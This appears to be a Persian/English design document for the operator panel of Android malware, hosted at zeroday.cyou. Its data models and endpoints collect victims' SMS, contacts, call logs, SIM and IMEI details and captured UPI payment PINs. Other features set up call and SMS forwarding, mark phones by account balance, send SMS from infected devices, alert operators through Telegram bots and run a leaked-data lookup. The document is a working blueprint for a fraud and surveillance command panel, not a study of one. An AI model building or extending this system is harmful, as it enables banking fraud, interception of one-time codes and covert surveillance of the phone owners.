# 📚 مستندات کامل پروژه Admin Panel

## 📋 فهرست مطالب

1. [معماری کلی](#معماری-کلی)
2. [فیچرها و قابلیت‌ها](#فیچرها-و-قابلیتها)
3. [مدل‌های داده](#مدلهای-داده)
4. [API Endpoints](#api-endpoints)
5. [WebSocket Events](#websocket-events)
6. [صفحات و کامپوننت‌ها](#صفحات-و-کامپوننتها)
7. [Theme و Design System](#theme-و-design-system)
8. [State Management](#state-management)

---

## 🏗️ معماری کلی

### Frontend Stack
```
React 18 + TypeScript
├── Vite (Build Tool)
├── TailwindCSS + shadcn/ui (Styling)
├── React Router (Routing)
├── Zustand (State Management)
├── TanStack Query (Data Fetching)
├── Axios (HTTP Client)
├── Socket.io-client (WebSocket)
└── Capacitor (Mobile Wrapper - اختیاری)
```

### Backend (فعلی)
```
Base URL: https://zeroday.cyou
- REST API
- WebSocket (/ws/admin)
- Authentication: JWT Bearer Token
```

---

## 🎯 فیچرها و قابلیت‌ها

### 1. Authentication & Authorization
- ✅ Login با Username/Password
- ✅ 2FA با Telegram OTP
- ✅ Session Management
- ✅ Auto Logout on Session Expire
- ✅ Role-based Access (Super Admin, Admin, Viewer)

### 2. Device Management
- ✅ لیست دستگاه‌ها با فیلتر و جستجو
- ✅ مشاهده جزئیات دستگاه
- ✅ Ping دستگاه (Firebase)
- ✅ حذف دستگاه
- ✅ نمایش وضعیت آنلاین/آفلاین
- ✅ نمایش اطلاعات سیم‌کارت (Dual SIM)
- ✅ نمایش UPI Pins
- ✅ Call Forwarding Status
- ✅ Device Notes (Priority: Low/High Balance)
- ✅ Mark Device (برای ارسال SMS)
- ✅ Real-time Updates via WebSocket

### 3. SMS Management
- ✅ مشاهده لیست SMS (Inbox/Sent)
- ✅ جستجو در پیام‌ها
- ✅ ارسال SMS از دستگاه
- ✅ Sync SMS از Firebase
- ✅ Export SMS (CSV/Excel)
- ✅ نمایش SIM Slot برای هر پیام
- ✅ Real-time SMS Updates

### 4. Contacts Management
- ✅ مشاهده لیست مخاطبین
- ✅ جستجو در مخاطبین
- ✅ Export Contacts (CSV/vCard)
- ✅ نمایش تعداد کل مخاطبین

### 5. Call Logs
- ✅ مشاهده تاریخچه تماس‌ها
- ✅ فیلتر بر اساس نوع (Incoming/Outgoing/Missed)
- ✅ نمایش مدت زمان تماس
- ✅ Export Call Logs

### 6. Device Logs & Activity
- ✅ مشاهده لاگ‌های دستگاه
- ✅ تاریخچه فعالیت‌ها

### 7. Admin Management (Super Admin Only)
- ✅ لیست ادمین‌ها
- ✅ ایجاد ادمین جدید
- ✅ ویرایش ادمین
- ✅ حذف ادمین
- ✅ مشاهده Activity Logs ادمین‌ها
- ✅ تنظیم Telegram Bots (5 بات)
- ✅ مدیریت Permissions
- ✅ تنظیم Expiry Date

### 8. Tools
- ✅ Leak Lookup (جستجوی اطلاعات نشت شده)
- ✅ Ping All Devices
- ✅ Multi-Device View (مشاهده چند دستگاه همزمان)

### 9. Profile & Settings
- ✅ مشاهده و ویرایش پروفایل
- ✅ تغییر رمز عبور
- ✅ تنظیم Telegram Bots
- ✅ تنظیم FCM Tokens
- ✅ Theme Toggle (Light/Dark/System)
- ✅ Language Selection (فعلاً فقط انگلیسی)

### 10. Statistics & Dashboard
- ✅ تعداد کل دستگاه‌ها
- ✅ دستگاه‌های آنلاین
- ✅ دستگاه‌های فعال/Pending
- ✅ آمار SMS، Contacts، Calls

---

## 📊 مدل‌های داده

### Device Model
```typescript
interface Device {
  deviceId: string;
  userId?: string;
  appType?: string;
  model: string;
  manufacturer: string;
  osVersion: string;
  appVersion?: string;
  status: 'online' | 'offline';
  batteryLevel: number;
  lastPing: string; // ISO date
  settings: DeviceSettings;
  stats: DeviceStats;
  registeredAt: string;
  updatedAt?: string;
  
  // Hardware Info
  brand?: string;
  deviceName?: string;
  device?: string;
  product?: string;
  hardware?: string;
  sdkInt?: number;
  
  // Battery
  batteryState?: string;
  isCharging?: boolean;
  
  // Storage
  totalStorageMb?: number;
  freeStorageMb?: number;
  storageUsedMb?: number;
  storagePercentFree?: number;
  
  // RAM
  totalRamMb?: number;
  freeRamMb?: number;
  ramUsedMb?: number;
  ramPercentFree?: number;
  
  // Network
  networkType?: string;
  ipAddress?: string;
  
  // Security
  isRooted?: boolean;
  isEmulator?: boolean;
  
  // SIM Info
  simInfo?: SimInfo[];
  
  // UPI
  hasUpi: boolean;
  upiDetectedAt?: string;
  upiPins?: UPIPinEntry[];
  upiLastUpdatedAt?: string;
  
  // Online Status
  isOnline?: boolean;
  lastOnlineUpdate?: string;
  
  // FCM
  fcmTokens?: string[];
  
  // Call Forwarding
  callForwardingEnabled?: boolean;
  callForwardingNumber?: string;
  callForwardingSimSlot?: number;
  callForwardingUpdatedAt?: string;
  
  // Notes
  notePriority?: 'lowbalance' | 'highbalance' | 'none';
  noteMessage?: string;
  noteCreatedAt?: string;
  adminNotePriority?: string;
  adminNoteMessage?: string;
  adminNoteCreatedAt?: string;
  
  // Uninstall Status
  isUninstalled?: boolean;
  uninstalledAt?: string;
}

interface DeviceSettings {
  smsForwardEnabled: boolean;
  forwardNumber?: string;
  monitoringEnabled: boolean;
  autoReplyEnabled: boolean;
}

interface DeviceStats {
  totalSms: number;
  totalContacts: number;
  totalCalls: number;
  lastSmsSyncDate?: string;
  lastContactSyncDate?: string;
  lastCallSyncDate?: string;
}

interface SimInfo {
  simSlot: number;
  subscriptionId?: number;
  carrierName: string;
  displayName: string;
  phoneNumber: string;
  countryIso?: string;
  mcc?: string;
  mnc?: string;
  isNetworkRoaming: boolean;
  networkType?: string;
  simState?: string;
  imei?: string;
  dataEnabled: boolean;
  voiceCapable: boolean;
  smsCapable: boolean;
}

interface UPIPinEntry {
  pin: string;
  appType: string;
  status: 'success' | 'failed';
  detectedAt: string;
}
```

### Admin Model
```typescript
interface Admin {
  username: string;
  email: string;
  fullName: string;
  role: 'super_admin' | 'admin' | 'viewer';
  permissions: string[];
  isActive: boolean;
  lastLogin?: string;
  loginCount: number;
  createdAt: string;
  deviceToken?: string;
  telegram2faChatId?: string;
  telegramBots?: TelegramBot[];
  fcmTokens?: string[];
  expiresAt?: string;
}

interface TelegramBot {
  botId: number; // 1-5
  botName: string;
  token: string;
  chatId: string;
}
```

### SMS Message Model
```typescript
interface SmsMessage {
  id: string;
  deviceId: string;
  from?: string;
  to?: string;
  body: string;
  timestamp: string;
  type: 'inbox' | 'sent';
  isRead: boolean;
  isFlagged: boolean;
  tags: string[];
  receivedAt: string;
  deliveryStatus?: string;
  deliveryDetails?: string;
  simPhoneNumber?: string;
  simSlot?: number;
}
```

### Call Log Model
```typescript
interface CallLog {
  id: string;
  callId?: string;
  number: string;
  name: string;
  timestamp: string;
  duration: number; // seconds
  callType: 'incoming' | 'outgoing' | 'missed' | 'rejected' | 'blocked';
}
```

### Contact Model
```typescript
interface Contact {
  id: string;
  deviceId: string;
  displayName: string;
  phoneNumber: string;
  email?: string;
  photoUri?: string;
  lastUpdated: string;
}
```

### Activity Log Model
```typescript
interface ActivityLog {
  id: string;
  adminUsername: string;
  action: string;
  details?: string;
  ipAddress?: string;
  userAgent?: string;
  timestamp: string;
}
```

---

## 🔌 API Endpoints

### Authentication
```
POST   /auth/login
POST   /auth/verify-2fa
POST   /auth/logout
GET    /auth/me
```

### Devices
```
GET    /api/devices
GET    /api/devices/:deviceId
DELETE /api/devices/:deviceId
GET    /api/stats
GET    /api/devices/app-types
POST   /api/devices/ping-all
POST   /api/devices/:deviceId/command
PUT    /api/devices/:deviceId/settings
PUT    /api/devices/:deviceId/note
```

### SMS
```
GET    /api/devices/:deviceId/sms
GET    /api/devices/:deviceId/sms/:smsId
DELETE /api/devices/:deviceId/sms/:smsId
POST   /api/devices/:deviceId/sms (send SMS)
```

### Contacts
```
GET    /api/devices/:deviceId/contacts
GET    /api/devices/:deviceId/contacts/:contactId
DELETE /api/devices/:deviceId/contacts/:contactId
```

### Call Logs
```
GET    /api/devices/:deviceId/calls
GET    /api/devices/:deviceId/calls/:callId
DELETE /api/devices/:deviceId/calls/:callId
```

### Device Logs
```
GET    /api/devices/:deviceId/logs
```

### Admin Management
```
POST   /admin/create
GET    /admin/list
PUT    /admin/:username
DELETE /admin/:username
GET    /admin/activities
GET    /admin/activities/stats
GET    /api/admin/:username/devices
```

### Marked Device (Super Admin)
```
POST   /api/admin/mark-device
POST   /api/admin/send-sms-to-marked-device
POST   /api/admin/confirm-send-sms-to-marked-device
GET    /api/admin/marked-device-info
PUT    /api/admin/set-marked-device-sms
```

### Tools
```
POST   /api/tools/leak-lookup
```

---

## 🔄 WebSocket Events

### Connection
```
ws://zeroday.cyou/ws/admin?token=JWT_TOKEN
```

### Client → Server
```typescript
// Subscribe to device updates
{
  action: 'subscribe',
  device_id: 'device123'
}

// Unsubscribe
{
  action: 'unsubscribe',
  device_id: 'device123'
}

// Ping
{
  action: 'ping'
}

// Pong (response to server ping)
{
  action: 'pong'
}
```

### Server → Client
```typescript
// Connection established
{
  type: 'connected',
  message: 'Connected to WebSocket'
}

// Subscription confirmed
{
  type: 'subscribed',
  device_id: 'device123'
}

// New SMS received
{
  type: 'sms',
  device_id: 'device123',
  sms: SmsMessage
}

// SMS updated
{
  type: 'sms_update',
  device_id: 'device123',
  sms: SmsMessage
}

// Device status updated
{
  type: 'device_update',
  device_id: 'device123',
  device: Device
}

// Device marked
{
  type: 'device_marked',
  device_id: 'device123',
  is_marked: true
}

// Device unmarked
{
  type: 'device_unmarked',
  device_id: 'device123',
  is_marked: false
}

// SMS confirmation required
{
  type: 'sms_confirmation_required',
  device_id: 'device123',
  message: string,
  recipients: string[]
}

// SMS sent via marked device
{
  type: 'sms_sent_via_mark',
  device_id: 'device123',
  success: boolean
}

// Server ping
{
  type: 'ping'
}

// Server pong
{
  type: 'pong'
}
```

---

## 🎨 Theme و Design System

### رنگ‌ها
```typescript
const colors = {
  primary: '#6366F1',      // Indigo 500
  secondary: '#8B5CF6',    // Violet 500
  accent: '#EC4899',       // Pink 500
  success: '#10B981',      // Emerald 500
  warning: '#F59E0B',      // Amber 500
  error: '#EF4444',        // Red 500
  info: '#3B82F6',         // Blue 500
  
  // Light Theme
  light: {
    background: '#F8FAFC',
    surface: '#FFFFFF',
    text: {
      primary: '#1E293B',
      secondary: '#475569',
      tertiary: '#64748B',
      disabled: '#94A3B8'
    }
  },
  
  // Dark Theme
  dark: {
    background: '#0B0F19',
    surface: '#1A1F2E',
    text: {
      primary: '#E8EAF0',
      secondary: '#B5BAC1',
      tertiary: '#9CA3AF',
      disabled: '#6B7280'
    }
  }
}
```

### فونت‌ها
```typescript
const fonts = {
  display: 'Poppins',  // برای عناوین
  body: 'Inter'        // برای متن‌ها
}

const fontSizes = {
  xs: '9.6px',
  sm: '10.4px',
  base: '11.2px',
  md: '12px',
  lg: '12.8px',
  xl: '14.4px',
  '2xl': '16px',
  '3xl': '19.2px',
  '4xl': '22.4px',
  '5xl': '25.6px'
}
```

### Border Radius
```typescript
const borderRadius = {
  sm: '6.4px',
  md: '8.96px',
  lg: '10.24px',
  xl: '12.8px',
  '2xl': '15.36px'
}
```

### Spacing
```typescript
const spacing = {
  xs: '6.4px',
  sm: '9.6px',
  md: '12.8px',
  lg: '16px',
  xl: '19.2px',
  '2xl': '22.4px'
}
```

---

## 📱 صفحات و کامپوننت‌ها

### صفحات اصلی

#### 1. Login Screen
- Username/Password Input
- Remember Me
- Gradient Background
- Animated Logo
- Error Handling

#### 2. OTP Verification Screen
- 6-digit OTP Input
- Resend OTP
- Timer Countdown
- Auto-submit

#### 3. Main Screen (Dashboard)
- Navigation (Sidebar/Bottom Nav)
- Device List با فیلتر و جستجو
- Stats Cards (Total, Online, Active, Pending)
- Real-time Updates
- Pull to Refresh

#### 4. Device Detail Screen
- Tabs: Info, SMS, Contacts, Calls, Logs
- Device Header (Status, Battery, Storage, RAM)
- Action Buttons (Ping, Delete, Mark, Note)
- Real-time Updates

#### 5. Profile Screen
- Admin Info
- Telegram Bots Configuration
- Change Password
- FCM Tokens

#### 6. Settings Screen
- Theme Toggle
- Language Selection
- Notifications Settings
- About

#### 7. Admin Management Screen (Super Admin)
- Admin List
- Create/Edit/Delete Admin
- Activity Logs
- Stats

#### 8. Leak Lookup Screen
- Search Input
- Results Display
- Export Results

---

### کامپوننت‌های مشترک

#### UI Components (shadcn/ui)
```
- Button
- Input
- Card
- Dialog
- Dropdown
- Tabs
- Badge
- Avatar
- Skeleton
- Toast
- Select
- Checkbox
- Switch
- Progress
- Separator
```

#### Custom Components
```typescript
// DeviceCard
interface DeviceCardProps {
  device: Device;
  onPing: (deviceId: string) => void;
  onDelete: (deviceId: string) => void;
  onClick: (deviceId: string) => void;
}

// StatsCard
interface StatsCardProps {
  title: string;
  value: number;
  icon: React.ReactNode;
  color: string;
  trend?: {
    value: number;
    isPositive: boolean;
  };
}

// EmptyState
interface EmptyStateProps {
  icon: React.ReactNode;
  title: string;
  description: string;
  action?: {
    label: string;
    onClick: () => void;
  };
}

// OfflineBanner
interface OfflineBannerProps {
  isOnline: boolean;
}

// DeviceStatusBadge
interface DeviceStatusBadgeProps {
  isOnline: boolean;
  lastPing: string;
}

// BatteryIndicator
interface BatteryIndicatorProps {
  level: number;
  isCharging: boolean;
}

// SimCard
interface SimCardProps {
  sim: SimInfo;
  slot: number;
}
```

---

## 🗂️ State Management

### Zustand Stores

#### Auth Store
```typescript
interface AuthState {
  admin: Admin | null;
  token: string | null;
  isAuthenticated: boolean;
  login: (username: string, password: string) => Promise<void>;
  verify2FA: (code: string) => Promise<void>;
  logout: () => Promise<void>;
  checkAuth: () => Promise<void>;
}
```

#### Device Store
```typescript
interface DeviceState {
  devices: Device[];
  selectedDevice: Device | null;
  isLoading: boolean;
  error: string | null;
  filters: DeviceFilters;
  fetchDevices: () => Promise<void>;
  fetchDevice: (id: string) => Promise<void>;
  deleteDevice: (id: string) => Promise<void>;
  pingDevice: (id: string) => Promise<void>;
  setFilters: (filters: DeviceFilters) => void;
}
```

#### Theme Store
```typescript
interface ThemeState {
  theme: 'light' | 'dark' | 'system';
  setTheme: (theme: 'light' | 'dark' | 'system') => void;
}
```

#### WebSocket Store
```typescript
interface WebSocketState {
  isConnected: boolean;
  subscribe: (deviceId: string) => void;
  unsubscribe: (deviceId: string) => void;
  onSmsReceived: (callback: (data: any) => void) => void;
  onDeviceUpdate: (callback: (data: any) => void) => void;
}
```

---

## 🔐 Authentication Flow

```
1. User enters username/password
   ↓
2. POST /auth/login
   ↓
3. If 2FA required:
   - Show OTP screen
   - User enters OTP
   - POST /auth/verify-2fa
   ↓
4. Receive JWT token
   ↓
5. Store token in localStorage
   ↓
6. Set Authorization header
   ↓
7. Connect WebSocket with token
   ↓
8. Redirect to Dashboard
```

### Session Expiry Handling
```
1. API returns 401/403 with x-session-expired header
   ↓
2. Clear localStorage
   ↓
3. Show "Session expired" toast
   ↓
4. Redirect to Login
```

---

## 📦 Export Functionality

### SMS Export
```typescript
// CSV Format
"ID","From","To","Body","Timestamp","Type","SIM Slot"

// Excel Format
Same as CSV but .xlsx

// JSON Format
[
  {
    "id": "...",
    "from": "...",
    "to": "...",
    "body": "...",
    "timestamp": "...",
    "type": "...",
    "simSlot": 0
  }
]
```

### Contacts Export
```typescript
// vCard Format
BEGIN:VCARD
VERSION:3.0
FN:John Doe
TEL:+1234567890
END:VCARD
```

---

## 🔔 Notifications

### Push Notifications (FCM)
```typescript
// Device ping response
{
  title: "Device Online",
  body: "Device {deviceId} responded to ping",
  data: {
    type: "device_ping",
    deviceId: "..."
  }
}

// New SMS received
{
  title: "New SMS",
  body: "From: {sender}",
  data: {
    type: "sms",
    deviceId: "...",
    smsId: "..."
  }
}
```

### In-App Notifications
- Toast messages برای success/error
- Real-time updates via WebSocket
- Badge counts برای unread items

---

## 🎯 Performance Optimizations

### 1. Data Fetching
- استفاده از TanStack Query برای caching
- Stale-while-revalidate strategy
- Pagination برای لیست‌های بزرگ

### 2. Real-time Updates
- WebSocket برای updates لحظه‌ای
- Debounce برای search inputs
- Throttle برای scroll events

### 3. Code Splitting
- Lazy loading برای routes
- Dynamic imports برای heavy components
- Suspense boundaries

### 4. Image Optimization
- Lazy loading images
- WebP format
- Responsive images

---

## 🧪 Testing Strategy

### Unit Tests
- Components با React Testing Library
- Hooks با @testing-library/react-hooks
- Utils functions با Jest

### Integration Tests
- API calls با MSW (Mock Service Worker)
- WebSocket با mock socket
- Store interactions

### E2E Tests
- Critical flows با Playwright/Cypress
- Login flow
- Device management
- SMS sending

---

## 📱 Mobile Considerations (Capacitor)

### Native Features
```typescript
// Push Notifications
import { PushNotifications } from '@capacitor/push-notifications';

// Local Storage
import { Preferences } from '@capacitor/preferences';

// Network Status
import { Network } from '@capacitor/network';

// App Info
import { App } from '@capacitor/app';

// Haptics
import { Haptics } from '@capacitor/haptics';
```

### Platform Detection
```typescript
import { Capacitor } from '@capacitor/core';

const isNative = Capacitor.isNativePlatform();
const platform = Capacitor.getPlatform(); // 'web', 'ios', 'android'
```

---

## 🚀 Deployment

### Web Deployment
```bash
# Build
npm run build

# Deploy to Vercel/Netlify/etc
vercel deploy
```

### Mobile Deployment
```bash
# Build web assets
npm run build

# Sync with Capacitor
npx cap sync

# Open in Android Studio
npx cap open android

# Open in Xcode
npx cap open ios
```

---

## 🔧 Environment Variables

```env
# API
VITE_API_BASE_URL=https://zeroday.cyou
VITE_WS_URL=wss://zeroday.cyou/ws/admin

# Firebase (optional)
VITE_FIREBASE_API_KEY=
VITE_FIREBASE_AUTH_DOMAIN=
VITE_FIREBASE_PROJECT_ID=

# Sentry (optional)
VITE_SENTRY_DSN=
```

---

## 📚 مراجع و منابع

- [React Documentation](https://react.dev)
- [Vite Documentation](https://vitejs.dev)
- [TailwindCSS](https://tailwindcss.com)
- [shadcn/ui](https://ui.shadcn.com)
- [TanStack Query](https://tanstack.com/query)
- [Zustand](https://zustand-demo.pmnd.rs)
- [Capacitor](https://capacitorjs.com)

---

**تاریخ آخرین بروزرسانی:** 2024
**نسخه:** 1.0.0
